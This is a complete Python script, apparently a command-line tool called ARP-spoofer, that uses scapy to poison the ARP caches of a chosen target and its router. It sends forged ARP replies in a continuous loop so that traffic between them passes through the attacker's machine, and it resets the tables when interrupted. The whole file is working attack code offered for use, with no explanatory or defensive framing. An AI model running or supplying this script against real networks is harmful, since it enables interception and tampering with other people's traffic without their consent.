#!/usr/bin/env python3

import scapy.all as scapy
import argparse
import sys
import time

def get_arguments():
    parser= argparse.ArgumentParser()
    parser.add_argument("-t","--target",dest="target_ip",help="The target IP address")
    parser.add_argument("-r","--router",dest="router_ip",help="The router IP address")
    options = parser.parse_args()
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_final_request = broadcast/arp_request
    answered = scapy.srp(arp_final_request, timeout=1, verbose=False)[0]
    return answered[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    mac = get_mac(target_ip)
    packet = scapy.ARP(op=2,hwdst=mac,pdst=target_ip,psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(target_ip, router_ip):
    mac_router = get_mac(router_ip)
    mac_target = get_mac(target_ip)
    packet = scapy.ARP(op=2,hwdst=mac_target,pdst=target_ip,psrc=router_ip,hwsrc=mac_router)
    scapy.send(packet, verbose=False)

def send_packet(target_ip, router_ip):
    sent_packets = 2 
    try:
        while True:
            spoof(target_ip, router_ip)
            spoof(router_ip, target_ip)
            print("\r[+]Packets sent: " +str(sent_packets),end="")
            sent_packets += 2
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[+]Detected CTRL + C ... Reseting ARP table ... Please wait!")
        restore(target_ip, router_ip)
        print("Quiting!")
    
def main():
    if len((sys.argv)) > 1:
        options = get_arguments()
        send_packet(options.target_ip, options.router_ip)
    else:
        print("Please input the arguments ... !")
        print("./ARP-spoofer --help --> to view the help menu !")


if __name__ == "__main__":
    main()